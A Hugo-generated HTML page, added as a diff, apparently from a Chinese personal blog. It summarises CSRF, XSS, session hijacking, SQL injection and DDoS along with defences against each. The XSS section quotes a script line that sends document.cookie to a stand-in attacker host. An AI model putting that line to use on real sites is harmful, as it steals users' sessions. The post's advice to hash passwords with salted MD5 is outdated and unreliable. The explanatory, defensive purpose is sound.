@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Chosen1cwp&#39;s Blog/posts/web_attack_desc/</title>
+    <meta name="description" content="chosen1cwp 的个人博客">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="all,follow">
+    <meta name="googlebot" content="index,follow,snippet,archive">
+    <link rel="stylesheet" href="https://blog.chosen1cwp.com/hugo-theme-console/css/terminal-0.7.1.min.css">
+    <link rel="stylesheet" href="https://blog.chosen1cwp.com/hugo-theme-console/css/animate-3.7.2.min.css">
+    <link rel="stylesheet" href="https://blog.chosen1cwp.com/hugo-theme-console/css/console.css">
+    
+      <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+      <![endif]-->
+       <meta property="og:title" content="常见web攻击方法及防御手段简要总结" />
+<meta property="og:description" content="chosen1cwp 的个人博客" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.chosen1cwp.com/posts/web_attack_desc/" /><meta property="article:published_time" content="2021-07-16T16:45:54+08:00" />
+
+
+
+<meta name="twitter:title" content="常见web攻击方法及防御手段简要总结"/>
+<meta name="twitter:description" content="1. CSRF （cross-site request forgery）跨站请求伪造 利用cookie，用户本地存储cookie，攻击者利用用户的cookie进行认证，然"/>
+
+</head>
+<body class="terminal">
+    <div class="container">
+        <div class="terminal-nav">
+          <header class="terminal-logo">
+            <div class="logo terminal-prompt">
+              
+              
+              <a href="https://blog.chosen1cwp.com/" class="no-style site-name">Chosen1cwp&#39;s Blog</a>:~# 
+              <a href='https://blog.chosen1cwp.com/posts'>posts</a>/<a href='https://blog.chosen1cwp.com/posts/web_attack_desc'>web_attack_desc</a>/</div></header>
+          <nav class="terminal-menu">
+            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
+                
+                <li><a href="https://blog.chosen1cwp.com/about/" typeof="ListItem">about/</a></li>
+                
+                <li><a href="https://blog.chosen1cwp.com/posts/" typeof="ListItem">posts/</a></li>
+                
+                <li><a href="https://blog.chosen1cwp.com/photos/" typeof="ListItem">photos/</a></li>
+                
+            </ul>
+          </nav>
+        </div>
+    </div>
+
+    <div class="container animated zoomIn fast">
+        
+<h1>常见web攻击方法及防御手段简要总结</h1>
+
+Jul. 16, 2021
+
+
+<br/><br/>
+<h3 id="1-csrf-cross-site-request-forgery跨站请求伪造">1. CSRF （cross-site request forgery）跨站请求伪造</h3>
+<blockquote>
+<p>利用cookie，用户本地存储cookie，攻击者利用用户的cookie进行认证，然后伪造用户发出请求，攻击者利用了存储在浏览器用于用户认证的cookie</p>
+</blockquote>
+<h4 id="预防">预防：</h4>
+<ol>
+<li>不用cookie来验证可以预防，采用token（不存储于浏览器）认证，为每一个提交的表单生成一个随机token， 存储在session中，每次验证表单token，检查token是否正确，</li>
+</ol>
+<p>所以我们的防御思路是这样：用户在访问网上银行时，除了携带 Cookie 中的信息之外，还需要携带一个随机数，如果用户没有携带这个随机数，则网上银行网站会拒绝该请求。黑客网站诱导用户点击超链接时，会自动携带上 Cookie 中的信息，但是却不会自动携带随机数，这样就成功的避免掉 CSRF 攻击了。</p>
+<ol start="2">
+<li>通过referer识别，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行A网站才能进行转账了。</li>
+</ol>
+<h4 id="补充">补充：</h4>
+<ul>
+<li>
+<p>Spring Security 中默认实际上就提供了 csrf 防御</p>
+</li>
+<li>
+<p>前端是 App、小程序之类的应用，不涉及浏览器应用的话，其实可以忽略这个问题</p>
+</li>
+</ul>
+<h3 id="2xss-cross-site-script跨站脚本攻击">2、XSS （cross site script）跨站脚本攻击</h3>
+<blockquote>
+<p>攻击者在网页中嵌入恶意脚本程序</p>
+</blockquote>
+<h4 id="举例">举例：</h4>
+<blockquote>
+<p>攻击者在上面发布了一个文章，内容是这样的 <!-- raw HTML omitted -->window.open(“www.gongji.com?param=”+document.cookie)<!-- raw HTML omitted -->,如果我没有对他的内容进行处理，直接存储到数据库，那么下一次当其他用户访问他的这篇文章的时候，服务器从数据库读取后然后响应给客户端，浏览器执行了这段脚本，然后就把该用户的cookie发送到攻击者的服务器了</p>
+</blockquote>
+<h4 id="被攻击原因">被攻击原因：</h4>
+<blockquote>
+<p>用户输入的数据没有做处理，变成了代码，比如说上面的<!-- raw HTML omitted -->,应该只是字符串却有了代码的作用</p>
+</blockquote>
+<h4 id="预防-1">预防：</h4>
+<blockquote>
+<p>转移和过滤用户提交的信息，将输入的数据进行转义处理，比如说讲 &lt; 转义成&amp;lt；</p>
+</blockquote>
+<h3 id="3session攻击会话劫持">3、session攻击，会话劫持</h3>
+<blockquote>
+<p>由于http本身无状态，同时如果想维持一个用户不同请求之间的状态，session ID用来认证用户
+用某种手段得到用户session ID，从而冒充用户进行请求</p>
+</blockquote>
+<h4 id="攻击原因">攻击原因：</h4>
+<ul>
+<li>预测：PHP生成的session ID足够复杂并且难于预测，基本不可能</li>
+<li>会话劫持： URL参数传递sessionID； 隐藏域传递sessionID；比较安全的是cookie传递。但同样可以被xss攻击取得sessionID</li>
+<li>会话固定： 诱骗用户使用指定的sessionID进行登录，这样系统不会分配新的sessionID</li>
+</ul>
+<h4 id="预防-2">预防：</h4>
+<ul>
+<li>每次登陆重置sessionID</li>
+<li>设置HTTPOnly，防止客户端脚本访问cookie信息，阻止xss攻击</li>
+<li>关闭透明化sessionID</li>
+<li>user-agent头信息验证</li>
+<li>token校验</li>
+</ul>
+<h3 id="4sql注入">4、SQL注入</h3>
+<blockquote>
+<p>通过sql命令伪装成正常的http请求参数，传递到服务器端，服务器执行sql命令造成对数据库进行攻击</p>
+</blockquote>
+<h4 id="攻击原因-1">攻击原因：</h4>
+<p>sql语句伪造参数，然后在对参数进行拼接的后形成破坏性的sql语句，最后导致数据库受到攻击</p>
+<h4 id="预防-3">预防：</h4>
+<blockquote>
+<p>在java中，我们可以使用预编译语句(PreparedStatement)，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。
+很多orm框架已经可以对参数进行转义
+做最坏的打算，即使被’拖库‘(&lsquo;脱裤，数据库泄露&rsquo;)。数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的（数据库存储用户名，盐（随机字符长），md5后的密文）方式</p>
+</blockquote>
+<h3 id="5ddos">5、DDOS</h3>
+<blockquote>
+<p>分布式拒绝服务攻击（Distributed Denial of Service），简单说就是发送大量请求是使服务器瘫痪。
+DDos攻击是在DOS攻击基础上的，可以通俗理解，dos是单挑，而ddos是群殴，因为现代技术的发展，dos攻击的杀伤力降低，所以出现了DDOS，攻击者借助公共网络，将大数量的计算机设备联合起来，向一个或多个目标进行攻击
+模拟正常用户发送大量请求直到该网站拒绝服务为止。</p>
+</blockquote>
+<h4 id="攻击原因-2">攻击原因：</h4>
+<blockquote>
+<p>服务器带宽不足，不能挡住攻击者的攻击流量</p>
+</blockquote>
+<h4 id="预防-4">预防：</h4>
+<ul>
+<li>最直接的方法增加带宽。但是攻击者用各地的电脑进行攻击，他的带宽不会耗费很多钱，但对于服务器来说，带宽非常昂贵。</li>
+<li>云服务提供商有自己的一套完整DDoS解决方案，并且能提供丰富的带宽资源</li>
+</ul>
+
+
+
+        <div class="footer">
+    Powered by <a href="https://gohugo.io/">chosen1cwp</a> with
+    <a href="https://github.com/chosen1cwp">Github Home</a>.
+</div>
+
+    </div>
+  </body>
+</html>
